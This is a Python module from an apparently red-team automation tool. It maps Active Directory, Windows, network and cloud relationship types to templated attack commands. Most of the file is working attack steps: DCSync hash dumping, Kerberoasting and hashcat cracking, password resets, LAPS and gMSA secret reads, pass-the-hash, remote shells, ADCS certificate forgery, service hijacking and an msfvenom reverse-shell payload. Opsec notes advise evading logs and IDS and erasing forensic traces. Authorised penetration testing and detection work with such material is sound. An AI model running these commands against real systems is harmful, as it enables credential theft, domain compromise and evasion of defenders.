"""Playbook step templates mapping relationship types to operator commands."""

from __future__ import annotations

from dataclasses import dataclass, field

from ariadne.models.relationship import RelationType


class SafeFormatDict(dict):
    """Dict subclass that returns '{key}' for missing keys in str.format_map().

    This allows templates with unfilled placeholders to render as-is
    so operators can fill them manually.
    """

    def __missing__(self, key: str) -> str:
        return "{" + key + "}"


@dataclass
class PlaybookStepTemplate:
    """Template for generating a playbook step from a relationship type."""

    commands: list[dict[str, object]] = field(default_factory=list)
    prerequisites: list[str] = field(default_factory=list)
    opsec_notes: list[str] = field(default_factory=list)
    fallback_commands: list[dict[str, object]] = field(default_factory=list)
    expected_output: str = ""
    detection_signatures: list[str] = field(default_factory=list)


# ============================================================================
# Template Database
# Key: (RelationType, Optional[technique_id])
# Lookup order: (type, technique) -> (type, None) -> None (LLM fallback)
# ============================================================================

PLAYBOOK_TEMPLATES: dict[tuple[RelationType, str | None], PlaybookStepTemplate] = {
    # -----------------------------------------------------------------------
    # Active Directory ACL Abuse
    # -----------------------------------------------------------------------
    (RelationType.HAS_GENERIC_ALL, None): PlaybookStepTemplate(
        commands=[
            {
                "tool": "impacket-secretsdump",
                "command": "secretsdump.py '{domain}/{username}:{credential_value}@{target_ip}'",
                "description": "DCSync to dump domain hashes via GenericAll on domain object",
                "requires_root": False,
                "requires_implant": False,
            },
            {
                "tool": "bloodyAD",
                "command": "bloodyAD -d {domain} -u {username} -p '{credential_value}' --host {target_ip} add genericAll '{target_username}' '{username}'",
                "description": "Abuse GenericAll to grant full control over target object",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        prerequisites=[
            "Valid credentials for source principal",
            "Network access to target DC (port 389/636)",
        ],
        opsec_notes=[
            "DCSync generates Windows Event 4662 (Directory Service Access)",
            "DACL modifications logged as Event 5136 (Directory Object Modified)",
            "Consider timing attacks outside business hours",
        ],
        fallback_commands=[
            {
                "tool": "PowerView",
                "command": "Add-DomainObjectAcl -TargetIdentity '{target_username}' -PrincipalIdentity '{username}' -Rights All",
                "description": "PowerShell-based DACL abuse (requires implant)",
                "requires_root": False,
                "requires_implant": True,
            },
        ],
        expected_output="Domain hashes in NTLM format or modified DACL confirmation",
        detection_signatures=[
            "Windows Event 4662 with GUID matching DS-Replication-Get-Changes",
            "Windows Event 5136 (nTSecurityDescriptor modification)",
        ],
    ),
    (RelationType.HAS_GENERIC_WRITE, None): PlaybookStepTemplate(
        commands=[
            {
                "tool": "targetedKerberoast",
                "command": "targetedKerberoast.py -d {domain} -u {username} -p '{credential_value}' --dc-ip {target_ip}",
                "description": "Set SPN on target and Kerberoast it via GenericWrite",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        prerequisites=[
            "Valid credentials for source principal",
            "Network access to DC (port 88/389)",
        ],
        opsec_notes=[
            "Setting an SPN generates Event 4742 (Computer Account Changed) or 4738 (User Account Changed)",
            "Kerberoasting generates Event 4769 (Kerberos Service Ticket Request)",
            "Remove SPN after obtaining ticket to reduce forensic footprint",
        ],
        fallback_commands=[
            {
                "tool": "impacket-GetUserSPNs",
                "command": "GetUserSPNs.py '{domain}/{username}:{credential_value}' -dc-ip {target_ip} -request -outputfile kerberoast.txt",
                "description": "Standard Kerberoasting (if SPN already set)",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        expected_output="Kerberos TGS ticket hash for offline cracking",
        detection_signatures=[
            "Windows Event 4769 with RC4 encryption (type 0x17)",
            "Windows Event 4738/4742 showing SPN modification",
        ],
    ),
    (RelationType.HAS_WRITE_DACL, None): PlaybookStepTemplate(
        commands=[
            {
                "tool": "impacket-dacledit",
                "command": "dacledit.py -action write -rights FullControl -principal '{username}' -target '{target_username}' '{domain}/{username}:{credential_value}'",
                "description": "Grant FullControl over target via WriteDacl",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        prerequisites=[
            "Valid credentials for source principal",
            "Network access to DC (port 389/636)",
        ],
        opsec_notes=[
            "DACL modification generates Event 5136",
            "Revert DACL changes after exploitation to reduce footprint",
        ],
        fallback_commands=[
            {
                "tool": "PowerView",
                "command": "Add-DomainObjectAcl -TargetIdentity '{target_username}' -PrincipalIdentity '{username}' -Rights DCSync",
                "description": "PowerShell DACL modification (requires implant)",
                "requires_root": False,
                "requires_implant": True,
            },
        ],
        expected_output="Successful ACE addition confirmed via LDAP query",
        detection_signatures=["Windows Event 5136 (nTSecurityDescriptor modification)"],
    ),
    (RelationType.HAS_WRITE_OWNER, None): PlaybookStepTemplate(
        commands=[
            {
                "tool": "impacket-owneredit",
                "command": "owneredit.py -action write -new-owner '{username}' -target '{target_username}' '{domain}/{username}:{credential_value}'",
                "description": "Take ownership of target object via WriteOwner",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        prerequisites=[
            "Valid credentials for source principal",
            "Network access to DC (port 389/636)",
        ],
        opsec_notes=[
            "Ownership change generates Event 4662",
            "After taking ownership, grant WriteDacl then FullControl",
            "Restore original owner after exploitation",
        ],
        fallback_commands=[
            {
                "tool": "PowerView",
                "command": "Set-DomainObjectOwner -Identity '{target_username}' -OwnerIdentity '{username}'",
                "description": "PowerShell ownership takeover (requires implant)",
                "requires_root": False,
                "requires_implant": True,
            },
        ],
        expected_output="Ownership changed successfully",
        detection_signatures=["Windows Event 4662 (ownership change on AD object)"],
    ),
    (RelationType.CAN_FORCE_CHANGE_PASSWORD, None): PlaybookStepTemplate(
        commands=[
            {
                "tool": "rpcclient",
                "command": "rpcclient -U '{domain}/{username}%{credential_value}' {target_ip} -c 'setuserinfo2 {target_username} 23 NewP@ssw0rd!'",
                "description": "Force password reset on target user via RPC",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        prerequisites=[
            "Valid credentials for source principal",
            "Network access to DC (port 445)",
        ],
        opsec_notes=[
            "Password reset generates Event 4724 (password reset attempt)",
            "Target user will be locked out of current sessions",
            "Consider timing during off-hours to avoid detection",
        ],
        fallback_commands=[
            {
                "tool": "net-rpc",
                "command": "net rpc password '{target_username}' 'NewP@ssw0rd!' -U '{domain}/{username}%{credential_value}' -S {target_ip}",
                "description": "Alternative password reset via net rpc",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        expected_output="Password changed successfully",
        detection_signatures=["Windows Event 4724 (attempt to reset account password)"],
    ),
    (RelationType.CAN_READ_LAPS, None): PlaybookStepTemplate(
        commands=[
            {
                "tool": "crackmapexec",
                "command": "crackmapexec ldap {target_ip} -u {username} -p '{credential_value}' -d {domain} -M laps",
                "description": "Read LAPS password for target computer",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        prerequisites=[
            "Valid credentials with LAPS read permission",
            "Network access to DC (port 389/636)",
            "LAPS deployed on target machine",
        ],
        opsec_notes=[
            "LAPS read access generates Event 4662 with ms-Mcs-AdmPwd attribute",
            "LAPS passwords rotate — use immediately or note rotation schedule",
        ],
        fallback_commands=[
            {
                "tool": "pyLAPS",
                "command": "pyLAPS.py --action get -d {domain} -u {username} -p '{credential_value}' --dc-ip {target_ip}",
                "description": "Alternative LAPS password retrieval",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        expected_output="Local administrator password for target machine",
        detection_signatures=["Windows Event 4662 (read of ms-Mcs-AdmPwd attribute)"],
    ),
    (RelationType.CAN_READ_GMSA, None): PlaybookStepTemplate(
        commands=[
            {
                "tool": "gMSADumper",
                "command": "gMSADumper.py -u {username} -p '{credential_value}' -d {domain}",
                "description": "Dump gMSA password for target service account",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        prerequisites=[
            "Valid credentials authorized to read gMSA password",
            "Network access to DC (port 389/636)",
        ],
        opsec_notes=[
            "gMSA password read generates Event 4662 with msDS-ManagedPassword attribute",
            "gMSA passwords are 256 bytes — use the NT hash directly",
        ],
        fallback_commands=[
            {
                "tool": "crackmapexec",
                "command": "crackmapexec ldap {target_ip} -u {username} -p '{credential_value}' -d {domain} --gmsa",
                "description": "Alternative gMSA dump via CrackMapExec",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        expected_output="gMSA NT hash for the service account",
        detection_signatures=["Windows Event 4662 (read of msDS-ManagedPassword attribute)"],
    ),
    (RelationType.HAS_SESSION, None): PlaybookStepTemplate(
        commands=[
            {
                "tool": "crackmapexec",
                "command": "crackmapexec smb {target_ip} -u {username} -H '{hash}' --local-auth",
                "description": "Pass-the-Hash to target where session exists",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        prerequisites=[
            "NTLM hash or credentials for the session user",
            "Network access to target (port 445)",
        ],
        opsec_notes=[
            "Pass-the-Hash generates Event 4624 (logon type 3)",
            "SMB connections are common — blend with normal traffic",
        ],
        fallback_commands=[
            {
                "tool": "impacket-psexec",
                "command": "psexec.py -hashes ':{hash}' '{domain}/{username}@{target_ip}'",
                "description": "PsExec with pass-the-hash",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        expected_output="Authenticated SMB session or command shell",
        detection_signatures=[
            "Windows Event 4624 (logon type 3 with NTLM auth)",
            "Windows Event 4648 (explicit credential use)",
        ],
    ),
    # Kerberoasting (technique-specific)
    (RelationType.HAS_GENERIC_ALL, "T1558.003"): PlaybookStepTemplate(
        commands=[
            {
                "tool": "impacket-GetUserSPNs",
                "command": "GetUserSPNs.py '{domain}/{username}:{credential_value}' -dc-ip {target_ip} -request -outputfile kerberoast.txt",
                "description": "Kerberoast all service accounts",
                "requires_root": False,
                "requires_implant": False,
            },
            {
                "tool": "hashcat",
                "command": "hashcat -m 13100 kerberoast.txt wordlist.txt -r rules/best64.rule",
                "description": "Crack Kerberos TGS tickets offline",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        prerequisites=[
            "Valid domain credentials",
            "Network access to DC (port 88)",
        ],
        opsec_notes=[
            "Kerberoasting generates Event 4769 per SPN requested",
            "Request only targeted SPNs to minimize log volume",
            "Use AES encryption type to avoid RC4 detection rules",
        ],
        expected_output="Cracked service account passwords",
        detection_signatures=[
            "Windows Event 4769 with RC4 encryption (type 0x17)",
            "High volume of 4769 events in short timeframe",
        ],
    ),
    # ADCS abuse (technique-specific)
    (RelationType.HAS_GENERIC_ALL, "ADCS"): PlaybookStepTemplate(
        commands=[
            {
                "tool": "certipy",
                "command": "certipy find -u {username}@{domain} -p '{credential_value}' -dc-ip {target_ip} -vulnerable",
                "description": "Enumerate vulnerable certificate templates",
                "requires_root": False,
                "requires_implant": False,
            },
            {
                "tool": "certipy",
                "command": "certipy req -u {username}@{domain} -p '{credential_value}' -ca '{ca_name}' -template '{template_name}' -upn administrator@{domain}",
                "description": "Request certificate as administrator via vulnerable template",
                "requires_root": False,
                "requires_implant": False,
            },
            {
                "tool": "certipy",
                "command": "certipy auth -pfx administrator.pfx -dc-ip {target_ip}",
                "description": "Authenticate with forged certificate to obtain TGT",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        prerequisites=[
            "Valid domain credentials",
            "Vulnerable certificate template (ESC1-ESC8)",
            "Network access to CA and DC",
        ],
        opsec_notes=[
            "Certificate requests logged in CA audit log",
            "ESC1 abuse is well-detected by modern EDR",
            "Consider ESC8 (NTLM relay to HTTP enrollment) for stealthier approach",
        ],
        expected_output="TGT for target principal (e.g., administrator)",
        detection_signatures=[
            "CA audit: certificate issued with unexpected SAN",
            "Windows Event 4768 with certificate-based auth",
        ],
    ),
    (RelationType.OWNS, None): PlaybookStepTemplate(
        commands=[
            {
                "tool": "impacket-dacledit",
                "command": "dacledit.py -action write -rights FullControl -principal '{username}' -target '{target_username}' '{domain}/{username}:{credential_value}'",
                "description": "As owner, grant FullControl over owned object",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        prerequisites=[
            "Valid credentials for the owning principal",
            "Network access to DC (port 389/636)",
        ],
        opsec_notes=[
            "Ownership already established — DACL modification less suspicious",
            "Still generates Event 5136",
        ],
        expected_output="FullControl ACE added to target object",
        detection_signatures=["Windows Event 5136 (nTSecurityDescriptor modification)"],
    ),
    (RelationType.CAN_ADD_MEMBER, None): PlaybookStepTemplate(
        commands=[
            {
                "tool": "net-rpc",
                "command": "net rpc group addmem '{target_group}' '{username}' -U '{domain}/{username}%{credential_value}' -S {target_ip}",
                "description": "Add controlled user to target group",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        prerequisites=[
            "Valid credentials for source principal",
            "Network access to DC (port 445)",
        ],
        opsec_notes=[
            "Group membership change generates Event 4728/4732/4756",
            "Adding to privileged groups triggers additional alerts in most SIEMs",
            "Remove membership after objective achieved",
        ],
        expected_output="User added to target group",
        detection_signatures=[
            "Windows Event 4728 (member added to security-enabled global group)",
            "Windows Event 4756 (member added to security-enabled universal group)",
        ],
    ),
    (RelationType.HAS_ALL_EXTENDED_RIGHTS, None): PlaybookStepTemplate(
        commands=[
            {
                "tool": "impacket-secretsdump",
                "command": "secretsdump.py '{domain}/{username}:{credential_value}@{target_ip}'",
                "description": "DCSync via AllExtendedRights (includes DS-Replication-Get-Changes-All)",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        prerequisites=[
            "Valid credentials for source principal",
            "Network access to DC (port 389/636)",
        ],
        opsec_notes=[
            "DCSync generates Event 4662 with replication GUIDs",
            "AllExtendedRights also grants password reset — consider ForceChangePassword as alternative",
        ],
        expected_output="Domain hashes in NTLM format",
        detection_signatures=[
            "Windows Event 4662 with GUID matching DS-Replication-Get-Changes-All",
        ],
    ),
    # -----------------------------------------------------------------------
    # Network Access
    # -----------------------------------------------------------------------
    (RelationType.CAN_SSH, None): PlaybookStepTemplate(
        commands=[
            {
                "tool": "ssh",
                "command": "ssh {username}@{target_ip} -p {port}",
                "description": "SSH to target host",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        prerequisites=[
            "Valid SSH credentials or key",
            "Network access to target (port {port})",
        ],
        opsec_notes=[
            "SSH login logged in /var/log/auth.log (or /var/log/secure)",
            "Consider using ProxyChains for pivoting through compromised hosts",
        ],
        fallback_commands=[
            {
                "tool": "proxychains-ssh",
                "command": "proxychains ssh {username}@{target_ip} -p {port}",
                "description": "SSH via SOCKS proxy through pivot host",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        expected_output="Interactive SSH shell on target",
        detection_signatures=[
            "auth.log: Accepted password/publickey for {username}",
            "sshd connection from unexpected source IP",
        ],
    ),
    (RelationType.CAN_RDP, None): PlaybookStepTemplate(
        commands=[
            {
                "tool": "xfreerdp",
                "command": "xfreerdp /v:{target_ip} /u:{username} /p:'{credential_value}' /d:{domain} /cert-ignore /dynamic-resolution",
                "description": "RDP to target host",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        prerequisites=[
            "Valid credentials with RDP access",
            "Network access to target (port 3389)",
            "NLA may require domain-joined machine or valid certificate",
        ],
        opsec_notes=[
            "RDP generates Event 4624 (logon type 10)",
            "RDP session visible in taskmgr to other admins",
            "Consider using SharpRDP for headless RDP command execution",
        ],
        fallback_commands=[
            {
                "tool": "SharpRDP",
                "command": "SharpRDP.exe computername={target_ip} command='cmd.exe /c whoami > C:\\temp\\out.txt' username={domain}\\{username} password='{credential_value}'",
                "description": "Headless RDP command execution (less visible)",
                "requires_root": False,
                "requires_implant": True,
            },
        ],
        expected_output="Interactive RDP session or command output",
        detection_signatures=[
            "Windows Event 4624 (logon type 10)",
            "Windows Event 1149 (RDS: user authentication succeeded)",
        ],
    ),
    (RelationType.CAN_PSREMOTE, None): PlaybookStepTemplate(
        commands=[
            {
                "tool": "evil-winrm",
                "command": "evil-winrm -i {target_ip} -u {username} -p '{credential_value}'",
                "description": "WinRM shell on target via Evil-WinRM",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        prerequisites=[
            "Valid credentials with PSRemoting access",
            "Network access to target (port 5985/5986)",
            "WinRM enabled on target",
        ],
        opsec_notes=[
            "WinRM generates Event 4624 (logon type 3) and Event 91 (WSMan)",
            "PowerShell logging (ScriptBlock, Module) captures command history",
            "Consider using -H flag for pass-the-hash if available",
        ],
        fallback_commands=[
            {
                "tool": "evil-winrm-hash",
                "command": "evil-winrm -i {target_ip} -u {username} -H '{hash}'",
                "description": "Evil-WinRM with pass-the-hash",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        expected_output="Interactive PowerShell session on target",
        detection_signatures=[
            "Windows Event 4624 (logon type 3 via WinRM)",
            "Windows Event 91 (WSMan operation)",
            "PowerShell Event 4104 (ScriptBlock logging)",
        ],
    ),
    (RelationType.ADMIN_TO, None): PlaybookStepTemplate(
        commands=[
            {
                "tool": "impacket-psexec",
                "command": "psexec.py '{domain}/{username}:{credential_value}@{target_ip}'",
                "description": "PsExec for SYSTEM shell via admin access",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        prerequisites=[
            "Admin credentials (password or NTLM hash)",
            "Network access to target (port 445)",
            "Admin$ share accessible",
        ],
        opsec_notes=[
            "PsExec creates a service (Event 7045) — highly detected",
            "Prefer WMIExec or SMBExec for lower detection profile",
            "PsExec drops a binary to ADMIN$ share",
        ],
        fallback_commands=[
            {
                "tool": "impacket-wmiexec",
                "command": "wmiexec.py '{domain}/{username}:{credential_value}@{target_ip}'",
                "description": "WMIExec — stealthier than PsExec (no service creation)",
                "requires_root": False,
                "requires_implant": False,
            },
            {
                "tool": "impacket-smbexec",
                "command": "smbexec.py '{domain}/{username}:{credential_value}@{target_ip}'",
                "description": "SMBExec — semi-interactive shell via SMB",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        expected_output="SYSTEM shell on target host",
        detection_signatures=[
            "Windows Event 7045 (new service installed — PsExec)",
            "Windows Event 4624 (logon type 3)",
            "Windows Event 4688 (process creation from service)",
        ],
    ),
    (RelationType.CAN_EXPLOIT, None): PlaybookStepTemplate(
        commands=[
            {
                "tool": "manual",
                "command": "# Exploit details depend on the specific vulnerability: {vuln_id}",
                "description": "Exploit target vulnerability (review finding details for specific exploit)",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        prerequisites=[
            "Exploit code or module for {vuln_id}",
            "Network access to vulnerable service",
        ],
        opsec_notes=[
            "Exploitation may crash the service — test in lab first",
            "Check for existing Metasploit module: {metasploit_module}",
            "Review exploit stability rating before use in production",
        ],
        expected_output="Code execution on target (specifics depend on vulnerability)",
        detection_signatures=[
            "IDS/IPS signatures for {vuln_id}",
            "Anomalous process creation following exploitation",
        ],
    ),
    # -----------------------------------------------------------------------
    # Cloud
    # -----------------------------------------------------------------------
    (RelationType.CAN_ASSUME, None): PlaybookStepTemplate(
        commands=[
            {
                "tool": "aws-cli",
                "command": "aws sts assume-role --role-arn '{target_arn}' --role-session-name 'ariadne' --profile {source_profile}",
                "description": "Assume IAM role (AWS)",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        prerequisites=[
            "Valid AWS credentials with sts:AssumeRole permission",
            "Trust policy allows source principal",
        ],
        opsec_notes=[
            "Role assumption logged in CloudTrail as AssumeRole event",
            "Session name visible in CloudTrail — use inconspicuous names",
            "Temporary credentials expire — note session duration",
        ],
        fallback_commands=[
            {
                "tool": "az-cli",
                "command": "az login --service-principal -u {app_id} -p '{credential_value}' --tenant {tenant_id}",
                "description": "Azure service principal login (if Azure environment)",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        expected_output="Temporary credentials (AccessKeyId, SecretAccessKey, SessionToken)",
        detection_signatures=[
            "CloudTrail: AssumeRole event from unexpected principal",
            "GuardDuty: UnauthorizedAccess finding",
        ],
    ),
    (RelationType.HAS_PERMISSION, None): PlaybookStepTemplate(
        commands=[
            {
                "tool": "aws-cli",
                "command": "# Enumerate and abuse IAM permissions for {target_username}\naws iam list-attached-user-policies --user-name {target_username}\naws iam list-user-policies --user-name {target_username}",
                "description": "Enumerate and escalate IAM permissions",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        prerequisites=[
            "Valid cloud credentials with the granted permission",
        ],
        opsec_notes=[
            "IAM enumeration logged in CloudTrail",
            "Privilege escalation via IAM is well-documented — check Rhino Security's IAM privesc paths",
        ],
        expected_output="Escalated cloud permissions or resource access",
        detection_signatures=[
            "CloudTrail: IAM policy enumeration from unexpected source",
            "CloudTrail: CreatePolicyVersion or AttachUserPolicy events",
        ],
    ),
    (RelationType.HAS_ROLE, None): PlaybookStepTemplate(
        commands=[
            {
                "tool": "aws-cli",
                "command": "# Leverage role permissions: {target_role}\naws sts get-caller-identity",
                "description": "Use existing role permissions for further access",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        prerequisites=["Active session with role attached"],
        opsec_notes=["Actions performed under role are logged with role ARN in CloudTrail"],
        expected_output="Confirmed identity and role permissions",
        detection_signatures=["CloudTrail: API calls from unexpected role"],
    ),
    # -----------------------------------------------------------------------
    # Generic access
    # -----------------------------------------------------------------------
    (RelationType.CAN_REACH, None): PlaybookStepTemplate(
        commands=[
            {
                "tool": "nmap",
                "command": "nmap -sV -sC -p- {target_ip} -oA scan_{target_hostname}",
                "description": "Full port scan of reachable target",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        prerequisites=["Network path to target"],
        opsec_notes=[
            "Full port scans are noisy — consider targeted scans of known ports",
            "Use -T2 timing for stealth or --scan-delay for IDS evasion",
        ],
        expected_output="Open ports, services, and versions on target",
        detection_signatures=["IDS: Port scan detected from source IP"],
    ),
    (RelationType.HAS_ACCESS, None): PlaybookStepTemplate(
        commands=[
            {
                "tool": "manual",
                "command": "# Leverage existing access to {target_ip} / {target_hostname}",
                "description": "Use authenticated access for further enumeration",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        prerequisites=["Authenticated access to target"],
        opsec_notes=["Minimize enumeration noise on authenticated sessions"],
        expected_output="Enumerated target environment and identified next steps",
    ),
    # -----------------------------------------------------------------------
    # Credential Sprawl
    # -----------------------------------------------------------------------
    (RelationType.CAN_AUTH_AS, None): PlaybookStepTemplate(
        commands=[
            {
                "tool": "crackmapexec",
                "command": "crackmapexec smb {target_ip} -u {username} -p '{credential_value}' -d {domain}",
                "description": "Authenticate as target user using discovered credential",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        prerequisites=[
            "Credential value (password, hash, or token) for target user",
            "Network access to authentication endpoint",
        ],
        opsec_notes=[
            "Login as discovered user generates standard logon events",
            "Event 4624 — check if target account is monitored or honeypot",
        ],
        expected_output="Authenticated session as target user",
        detection_signatures=[
            "Windows Event 4624 (logon from unexpected source for target user)",
        ],
    ),
    (RelationType.CREDENTIAL_REUSE, None): PlaybookStepTemplate(
        commands=[
            {
                "tool": "crackmapexec",
                "command": "crackmapexec smb {target_ip} -u {username} -p '{credential_value}' -d {domain}",
                "description": "Authenticate to target using reused credential",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        prerequisites=[
            "Reused credential value (password or hash)",
            "Network access to target (port 445)",
        ],
        opsec_notes=[
            "Credential reuse is common — same cred from multiple sources may trigger correlation alerts",
            "Event 4624 type 3 — SMB logon from unexpected source",
            "Consider using one source IP to avoid multi-source correlation",
        ],
        fallback_commands=[
            {
                "tool": "crackmapexec",
                "command": "crackmapexec smb {target_ip} -u {username} -H '{hash}' -d {domain}",
                "description": "Pass-the-Hash variant with reused NTLM hash",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        expected_output="Authenticated session on target host",
        detection_signatures=[
            "Windows Event 4624 (logon type 3 — same credential from multiple sources)",
            "SIEM correlation: same account authenticating from multiple hosts",
        ],
    ),
    # -----------------------------------------------------------------------
    # Privilege Escalation
    # -----------------------------------------------------------------------
    (RelationType.CAN_PRIVESC, "T1134.001"): PlaybookStepTemplate(
        commands=[
            {
                "tool": "GodPotato",
                "command": "GodPotato.exe -cmd 'cmd /c whoami'",
                "description": "Exploit SeImpersonatePrivilege via GodPotato",
                "requires_root": False,
                "requires_implant": True,
            },
            {
                "tool": "PrintSpoofer",
                "command": "PrintSpoofer64.exe -i -c cmd",
                "description": "Exploit SeImpersonatePrivilege via PrintSpoofer",
                "requires_root": False,
                "requires_implant": True,
            },
        ],
        prerequisites=[
            "SeImpersonatePrivilege assigned to current token",
            "Running as service account (IIS, MSSQL, etc.)",
        ],
        opsec_notes=[
            "Token impersonation may trigger EDR — test in lab first",
            "GodPotato works on modern Windows (2019/2022)",
            "JuicyPotato is legacy alternative for older systems",
        ],
        fallback_commands=[
            {
                "tool": "JuicyPotato",
                "command": "JuicyPotato.exe -l 1337 -p cmd.exe -t * -c '{{CLSID}}'",
                "description": "Legacy SeImpersonate exploit (pre-2019)",
                "requires_root": False,
                "requires_implant": True,
            },
        ],
        expected_output="SYSTEM shell or command output as NT AUTHORITY\\SYSTEM",
        detection_signatures=[
            "Sysmon Event 1: suspicious child process from service account",
            "Named pipe creation matching potato tool patterns",
        ],
    ),
    (RelationType.CAN_PRIVESC, "T1574.010"): PlaybookStepTemplate(
        commands=[
            {
                "tool": "manual",
                "command": "# 1. Identify modifiable service binary\nsc qc {service_name}\nicacls {service_binary_path}\n# 2. Replace binary\ncopy {service_binary_path} {service_binary_path}.bak\ncopy payload.exe {service_binary_path}\n# 3. Restart service\nsc stop {service_name} && sc start {service_name}",
                "description": "Replace modifiable service binary for SYSTEM execution",
                "requires_root": False,
                "requires_implant": True,
            },
        ],
        prerequisites=[
            "Write access to service binary path",
            "Ability to restart the service (or wait for reboot)",
        ],
        opsec_notes=[
            "Service binary replacement is highly detected by EDR",
            "Backup original binary and restore after exploitation",
            "Service crash may alert administrators",
        ],
        expected_output="Payload executes as SYSTEM when service restarts",
        detection_signatures=[
            "Windows Event 7034 (service crashed unexpectedly)",
            "Windows Event 7045 (new service installed)",
            "File integrity monitoring on service binaries",
        ],
    ),
    (RelationType.CAN_PRIVESC, "T1574.009"): PlaybookStepTemplate(
        commands=[
            {
                "tool": "manual",
                "command": '# 1. Identify unquoted service path\nwmic service get name,displayname,pathname,startmode | findstr /i auto | findstr /i /v "C:\\Windows\\\\" | findstr /i /v "\\""\n# 2. Place executable in path gap\ncopy payload.exe "C:\\Program Files\\Vulnerable App\\Vulnerable.exe"\n# 3. Restart service\nsc stop {service_name} && sc start {service_name}',
                "description": "Exploit unquoted service path for privilege escalation",
                "requires_root": False,
                "requires_implant": True,
            },
        ],
        prerequisites=[
            "Unquoted service path with space in directory name",
            "Write access to intermediate path directory",
        ],
        opsec_notes=[
            "Low reliability — depends on directory write permissions",
            "Service may not restart cleanly with injected binary",
        ],
        expected_output="Payload executes as service account (often SYSTEM)",
        detection_signatures=[
            "Unexpected executable in Program Files subdirectory",
            "Windows Event 7034/7045 for affected service",
        ],
    ),
    (RelationType.CAN_PRIVESC, "T1548.002"): PlaybookStepTemplate(
        commands=[
            {
                "tool": "msiexec",
                "command": "msiexec /quiet /qn /i payload.msi",
                "description": "Install malicious MSI with AlwaysInstallElevated",
                "requires_root": False,
                "requires_implant": True,
            },
        ],
        prerequisites=[
            "AlwaysInstallElevated enabled in HKLM and HKCU",
            "Ability to create or transfer MSI payload",
        ],
        opsec_notes=[
            "MSI installation logged in Application Event Log",
            "Consider using msfvenom to generate MSI payload",
            "msiexec /quiet suppresses UI but not event logs",
        ],
        fallback_commands=[
            {
                "tool": "msfvenom",
                "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f msi -o payload.msi",
                "description": "Generate MSI payload with reverse shell",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        expected_output="SYSTEM-level code execution via MSI install",
        detection_signatures=[
            "Windows Installer Event 1033/1034 (MSI install/complete)",
            "AppLocker/WDAC: msiexec loading unsigned MSI",
        ],
    ),
    (RelationType.CAN_PRIVESC, None): PlaybookStepTemplate(
        commands=[
            {
                "tool": "manual",
                "command": "# Review finding details for specific privilege escalation technique\n# Finding: {finding_title}\n# Technique: {technique_id}",
                "description": "Generic privilege escalation — review finding for exploitation details",
                "requires_root": False,
                "requires_implant": True,
            },
        ],
        prerequisites=[
            "Access to target host at current privilege level",
            "Review finding details for specific requirements",
        ],
        opsec_notes=[
            "Privilege escalation techniques vary in detection risk",
            "Test in lab environment before production use",
        ],
        expected_output="Elevated privileges on target host",
        detection_signatures=[
            "Varies by technique — review MITRE ATT&CK detection guidance",
        ],
    ),
    # -----------------------------------------------------------------------
    # Trust Relationships
    # -----------------------------------------------------------------------
    (RelationType.TRUSTS, None): PlaybookStepTemplate(
        commands=[
            {
                "tool": "impacket-GetUserSPNs",
                "command": "GetUserSPNs.py '{domain}/{username}:{credential_value}' -target-domain {target_domain} -dc-ip {target_ip} -request",
                "description": "Cross-trust Kerberoasting via domain trust",
                "requires_root": False,
                "requires_implant": False,
            },
        ],
        prerequisites=[
            "Valid credentials in trusting domain",
            "Trust relationship allows cross-domain auth",
        ],
        opsec_notes=[
            "Cross-trust auth generates logs in both domains",
            "SID history injection possible with forest trusts (requires DA in child)",
        ],
        expected_output="Cross-domain TGS tickets or inter-realm TGT",
        detection_signatures=[
            "Windows Event 4769 from external domain",
            "Windows Event 4768 with cross-realm referral",
        ],
    ),
}


def lookup_template(
    relation_type: RelationType,
    technique_id: str | None = None,
) -> PlaybookStepTemplate | None:
    """Look up a playbook template for a given relationship type and technique.

    Lookup order:
    1. (relation_type, technique_id) — exact match
    2. (relation_type, None) — fallback to generic template
    3. None — no template found (LLM fallback needed)
    """
    if technique_id:
        template = PLAYBOOK_TEMPLATES.get((relation_type, technique_id))
        if template:
            return template

    return PLAYBOOK_TEMPLATES.get((relation_type, None))
